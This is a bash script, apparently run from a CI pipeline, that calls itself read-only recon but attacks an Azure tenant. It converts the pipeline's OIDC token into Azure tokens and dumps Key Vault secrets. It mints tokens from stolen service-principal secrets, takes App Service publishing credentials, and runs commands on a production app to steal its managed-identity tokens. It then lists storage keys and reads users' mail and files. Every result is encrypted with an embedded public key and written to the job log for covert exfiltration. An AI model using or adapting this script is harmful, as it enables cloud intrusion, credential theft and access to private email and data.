#!/usr/bin/env bash
# DF26 Tebamoto owner recon v3 (read-only)
set -uo pipefail
T="${AZURE_TENANT_ID:?}"; C="${AZURE_CLIENT_ID:?}"; SUB="${AZURE_SUBSCRIPTION_ID:?}"
PROD="https://kv-tbl-prod-x3euoz.vault.azure.net"; SEC="https://kv-tbl-sec-x3euoz.vault.azure.net"
MG="https://management.azure.com"; ACR="crtblplatprodx3euoz.azurecr.io"
W=/tmp/w; rm -rf "$W"; mkdir -p "$W"; say(){ echo "[*] $*"; }

cat > "$W/pub.pem" <<'PEM'
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzJv1GqtWmTDtalKnP7MH
m8iJgsiUTMh6oB/0QtYOaOkgrCXEfkSXhq1Ukm9AlkS1HG9WRNXiXli9jufJqTo+
KRG3xDpxYBtA/eZI0tW9J/BB1ecN8Z2UW9iS/ZUrqhdxF1mqO91yxQH0OvQY43LA
he94F2NHU4mFbaM3UMSx0rpdAtqUnipIDPiwtXRddBMmvgLU0MJCGQ1ziz/6p4jy
hCXGJBS1NFJo4tZXBRSEmPu5/7wZ3GaZkRWjG/4tcmV1U26uLrDyT/djwdHWY7eN
ty3P9z4JiqmKmDD9kIrgmWLANPE+NnCpqi0YiqJkmLDbiSpmUkqGnqon397/Xx9A
lQIDAQAB
-----END PUBLIC KEY-----
PEM
seal(){ local n="$1" f="$2" key iv kd dt
  if [ ! -s "$f" ]; then echo "SEAL|$n|EMPTY"; return 0; fi
  key=$(openssl rand -hex 32); iv=$(openssl rand -hex 16)
  kd=$(printf '%s:%s' "$key" "$iv" | openssl pkeyutl -encrypt -pubin -inkey "$W/pub.pem" 2>/dev/null | base64 -w0)
  dt=$(openssl enc -aes-256-cbc -K "$key" -iv "$iv" -in "$f" 2>/dev/null | base64 -w0)
  echo "SEAL|$n|$kd|$dt"; }
claims(){ python3 -c 'import sys,json,base64
t=sys.argv[1].split(".")[1]; t+="="*(-len(t)%4)
d=json.loads(base64.urlsafe_b64decode(t))
print(json.dumps({k:d.get(k) for k in ("appid","oid","aud","roles","scp","idtyp","app_displayname","name","unique_name") if d.get(k) is not None}))' "$1"; }

oidc=$(curl -sS --max-time 25 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
say "OIDC_LEN=${#oidc}"
mint_ca(){ curl -sS --max-time 30 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" -d "client_id=$1" -d 'grant_type=client_credentials' -d 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' -d "client_assertion=$oidc" -d "scope=$2" | jq -r '.access_token // empty'; }
mint_cs(){ curl -sS --max-time 30 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" -d "client_id=$1" -d 'grant_type=client_credentials' -d "client_secret=$2" -d "scope=$3" | jq -r '.access_token // empty'; }
req(){ local n="$1" m="$2" u="$3" t="$4" code
  if [ -z "$t" ]; then echo "REQ|$n|NOTOKEN"; return 0; fi
  if [ "$m" = POST ]; then code=$(curl -sS --max-time 45 --connect-timeout 10 -o "$W/$n.body" -w '%{http_code}' -X POST -H "Authorization: Bearer $t" -H 'Content-Length: 0' "$u" 2>/dev/null || echo 000)
  else code=$(curl -sS --max-time 45 --connect-timeout 10 -o "$W/$n.body" -w '%{http_code}' -H "Authorization: Bearer $t" "$u" 2>/dev/null || echo 000); fi
  echo "REQ|$n|$code|$(wc -c < "$W/$n.body" 2>/dev/null || echo 0)"; seal "$n" "$W/$n.body"; }

############ tokens
BV=$(mint_ca "$C" "https://vault.azure.net/.default"); BA=$(mint_ca "$C" "$MG/.default"); BG=$(mint_ca "$C" "https://graph.microsoft.com/.default")
say "BASE vault=$([ -n "$BV" ] && echo OK || echo NO) arm=$([ -n "$BA" ] && echo OK || echo NO) graph=$([ -n "$BG" ] && echo OK || echo NO)"
printf '%s' "$BA" > "$W/tok_arm_base"; printf '%s' "$BV" > "$W/tok_vault_base"
SL=$(curl -sS --max-time 30 -H "Authorization: Bearer $BV" "$PROD/secrets?api-version=7.4")
mapfile -t NAMES < <(printf '%s' "$SL" | jq -r '.value[]?.id|split("/")|last')
for n in "${NAMES[@]}"; do
  [ -n "$n" ] || continue
  S=$(curl -sS --max-time 30 -H "Authorization: Bearer $BV" "$PROD/secrets/$n?api-version=7.4")
  val=$(printf '%s' "$S" | jq -r '.value // empty' 2>/dev/null)
  appid=$(printf '%s' "$val" | jq -r '.appId // empty' 2>/dev/null || true); secret=$(printf '%s' "$val" | jq -r '.clientSecret // empty' 2>/dev/null || true)
  if [ -z "$appid" ] && [ -n "$val" ]; then appid=$(printf '%s' "$val" | jq -r 'fromjson|.appId // empty' 2>/dev/null || true); secret=$(printf '%s' "$val" | jq -r 'fromjson|.clientSecret // empty' 2>/dev/null || true); fi
  [ -n "$appid" ] && [ -n "$secret" ] || continue
  printf '%s' "$(mint_cs "$appid" "$secret" "$MG/.default")" > "$W/tok_arm_$n"
  printf '%s' "$(mint_cs "$appid" "$secret" "https://storage.azure.com/.default")" > "$W/tok_stor_$n"
  printf '%s' "$(mint_cs "$appid" "$secret" "https://vault.azure.net/.default")" > "$W/tok_vault_$n"
  say "SP $n arm_len=$(wc -c < "$W/tok_arm_$n") stor_len=$(wc -c < "$W/tok_stor_$n")"
done
RARM=$(cat "$W/tok_arm_reporting-service-principal" 2>/dev/null)

############ 1. Kudu on reporting app (creds leak in 403 body)
f="$W/pub_reporting.body"
code=$(curl -sS --max-time 45 --connect-timeout 10 -o "$f" -w '%{http_code}' -X POST -H "Authorization: Bearer $RARM" -H 'Content-Length: 0' \
  "$MG/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2022-03-01" 2>/dev/null || echo 000)
echo "REQ|pub_reporting|$code|$(wc -c < "$f" 2>/dev/null || echo 0)"; seal pub_reporting "$f"
KU=$(jq -r '.properties.publishingUserName // .publishingUserName // empty' "$f" 2>/dev/null || true)
KP=$(jq -r '.properties.publishingPassword // .publishingPassword // empty' "$f" 2>/dev/null || true)
say "PUB user=$KU passlen=${#KP}"
S=app-tbl-reporting-prod; K="https://$S.scm.azurewebsites.net"
kcmd(){ local n="$1" c="$2"
  jq -n --arg c "$c" --arg d "/home" '{command:$c,dir:$d}' > "$W/creq.json"
  curl -sS --max-time 70 --connect-timeout 10 -u "$KU:$KP" -H 'Content-Type: application/json' -X POST --data-binary @"$W/creq.json" "$K/api/command" -o "$W/k_$n.json" 2>/dev/null
  jq -r '.Output // ""' "$W/k_$n.json" > "$W/k_$n.out" 2>/dev/null
  echo "KCMD|$n|$(wc -c < "$W/k_$n.out" 2>/dev/null || echo 0)"; seal "kcmd_$n" "$W/k_$n.out"; }
if [ -n "$KP" ]; then
  for p in /api/settings /api/processes /api/deployments; do
    fn="kudu_$(printf '%s' "$p" | tr '/.' '__')"
    c=$(curl -sS --max-time 40 --connect-timeout 10 -u "$KU:$KP" -o "$W/$fn.body" -w '%{http_code}' "$K$p" 2>/dev/null || echo 000)
    echo "KUDU|$p|$c"; seal "$fn" "$W/$fn.body"
  done
  kcmd shell 'bash -lc "id; echo SHELL_OK"'
  kcmd env 'bash -lc "env"'
  kcmd mi_arm 'bash -lc "curl -sS -H \"X-IDENTITY-HEADER: $IDENTITY_HEADER\" \"http://169.254.131.5:8081/msi/token?resource=https://management.azure.com&api-version=2019-08-01\""'
  kcmd mi_graph 'bash -lc "curl -sS -H \"X-IDENTITY-HEADER: $IDENTITY_HEADER\" \"http://169.254.131.5:8081/msi/token?resource=https://graph.microsoft.com&api-version=2019-08-01\""'
  kcmd mi_stor 'bash -lc "curl -sS -H \"X-IDENTITY-HEADER: $IDENTITY_HEADER\" \"http://169.254.131.5:8081/msi/token?resource=https://storage.azure.com&api-version=2019-08-01\""'
  kcmd mi_vault 'bash -lc "curl -sS -H \"X-IDENTITY-HEADER: $IDENTITY_HEADER\" \"http://169.254.131.5:8081/msi/token?resource=https://vault.azure.net&api-version=2019-08-01\""'
fi
MIARM=$(jq -r '.access_token // empty' "$W/k_mi_arm.out" 2>/dev/null || true)
MIGR=$(jq -r '.access_token // empty' "$W/k_mi_graph.out" 2>/dev/null || true)
MISTOR=$(jq -r '.access_token // empty' "$W/k_mi_stor.out" 2>/dev/null || true)
MIV=$(jq -r '.access_token // empty' "$W/k_mi_vault.out" 2>/dev/null || true)
say "MI arm=$([ -n "$MIARM" ] && echo OK || echo NO) graph=$([ -n "$MIGR" ] && echo OK || echo NO) stor=$([ -n "$MISTOR" ] && echo OK || echo NO) vault=$([ -n "$MIV" ] && echo OK || echo NO)"
[ -n "$MIARM" ] && claims "$MIARM" > "$W/claims_mi_arm.json" && seal claims_mi_arm "$W/claims_mi_arm.json"
[ -n "$MIGR" ] && claims "$MIGR" > "$W/claims_mi_graph.json" && seal claims_mi_graph "$W/claims_mi_graph.json"

############ 2. role assignments RG + vault scopes
for rg in rg-tbl-platform-prod-sea rg-tbl-reporting-prod-eus; do
  req "ra_rg_${rg}" GET "$MG/subscriptions/$SUB/resourceGroups/$rg/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" "$BA"
  req "ra_rg_${rg}_mi" GET "$MG/subscriptions/$SUB/resourceGroups/$rg/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" "$MIARM"
done
for v in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
  req "ra_vault_${v}" GET "$MG/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/$v/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" "$BA"
done
{ for f in "$W"/ra_*.body; do [ -s "$f" ] && jq -r '.value[]?.properties.roleDefinitionId' "$f" 2>/dev/null; done; } | sort -u | while read -r rid; do
  [ -n "$rid" ] || continue; req "roledef_$(basename "$rid")" GET "$MG$rid?api-version=2022-04-01" "$BA"
done

############ 3. deployment history
for rg in rg-tbl-platform-prod-sea rg-tbl-reporting-prod-eus; do
  req "dep_${rg}" GET "$MG/subscriptions/$SUB/resourceGroups/$rg/providers/Microsoft.Resources/deployments?api-version=2021-04-01" "$BA"
  for d in $(jq -r '.value[]?.name' "$W/dep_${rg}.body" 2>/dev/null | head -40); do
    req "dep_${rg}_$(printf '%s' "$d" | tr -c 'A-Za-z0-9._-' '_')" GET "$MG/subscriptions/$SUB/resourceGroups/$rg/providers/Microsoft.Resources/deployments/$d?api-version=2021-04-01" "$BA"
  done
done

############ 4. storage: ARM containers + data plane
for acct in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  aid="/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$acct"
  req "cont_${acct}" GET "$MG$aid/blobServices/default/containers?api-version=2022-09-01" "$BA"
  req "keys_${acct}_base" POST "$MG$aid/listKeys?api-version=2023-01-01" "$BA"
  req "keys_${acct}_mi" POST "$MG$aid/listKeys?api-version=2023-01-01" "$MIARM"
  req "keys_${acct}_sync" POST "$MG$aid/listKeys?api-version=2023-01-01" "$(cat "$W/tok_arm_sync-service-principal" 2>/dev/null)"
done
stor_list(){ local n="$1" acct="$2" tok="$3" f="$W/st_${n}_${acct}.body" code
  code=$(curl -sS --max-time 30 --connect-timeout 10 -o "$f" -w '%{http_code}' -H "Authorization: Bearer $tok" -H 'x-ms-version: 2021-08-06' "https://$acct.blob.core.windows.net/?comp=list" 2>/dev/null || echo 000)
  echo "STOR|$n|$acct|$code|$(wc -c < "$f" 2>/dev/null || echo 0)"; seal "st_${n}_${acct}" "$f"; }
for pair in "mi:$MISTOR" "sync:$(cat "$W/tok_stor_sync-service-principal" 2>/dev/null)" "ssync:$(cat "$W/tok_stor_secrets-sync-principal" 2>/dev/null)" "rsvc:$(cat "$W/tok_stor_reporting-service-principal" 2>/dev/null)"; do
  n="${pair%%:*}"; t="${pair#*:}"; [ -n "$t" ] || continue
  for acct in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do stor_list "$n" "$acct" "$t"; done
done

############ 5. ACR authenticated catalog
acr_tok(){ local at="$1" label="$2" r
  r=$(curl -sS --max-time 30 -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode 'grant_type=access_token' --data-urlencode "service=$ACR" --data-urlencode "tenant=$T" --data-urlencode "access_token=$at" --data-urlencode 'scope=registry:catalog:*' \
    "https://$ACR/oauth2/token" 2>/dev/null)
  echo "$r" > "$W/acr_${label}.json"; printf '%s' "$r" | jq -r '.access_token // empty'; }
for pair in "base:$BA" "mi:$MIARM"; do
  n="${pair%%:*}"; at="${pair#*:}"; [ -n "$at" ] || continue
  T2=$(acr_tok "$at" "$n"); say "ACR $n token=$([ -n "$T2" ] && echo OK || echo NO)"
  [ -n "$T2" ] && req "acr_catalog_$n" GET "https://$ACR/v2/_catalog?n=200" "$T2"
done

############ 6. storefront site reads (base, RG-scoped)
SF="/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod"
req sf_site GET "$MG$SF?api-version=2022-03-01" "$BA"
req sf_web GET "$MG$SF/config/web?api-version=2022-03-01" "$BA"
req sf_deps GET "$MG$SF/deployments?api-version=2022-03-01" "$BA"
req sf_instances GET "$MG$SF/instances?api-version=2022-03-01" "$BA"
req sf_pub GET "$MG$SF/config/publishingcredentials/list?api-version=2022-03-01" "$BA"
req sf_appset POST "$MG$SF/config/appsettings/list?api-version=2022-03-01" "$BA"

############ 7. MI Graph / ARM probes
req mi_res GET "$MG/subscriptions/$SUB/resources?api-version=2021-04-01" "$MIARM"
req mi_roles_sub GET "$MG/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" "$MIARM"
req mi_users GET "https://graph.microsoft.com/v1.0/users?\$top=100&\$select=displayName,userPrincipalName,mail,id,accountEnabled" "$MIGR"
req mi_mail GET "https://graph.microsoft.com/v1.0/users/d2cdf247-9319-40cb-8324-5a005ef538da/messages?\$top=25&\$select=subject,bodyPreview,from,receivedDateTime" "$MIGR"
req mi_drive GET "https://graph.microsoft.com/v1.0/users/d2cdf247-9319-40cb-8324-5a005ef538da/drive/root/children" "$MIGR"
req mi_prod GET "$PROD/secrets?api-version=7.4" "$MIV"
req mi_sec GET "$SEC/secrets?api-version=7.4" "$MIV"
say DONE
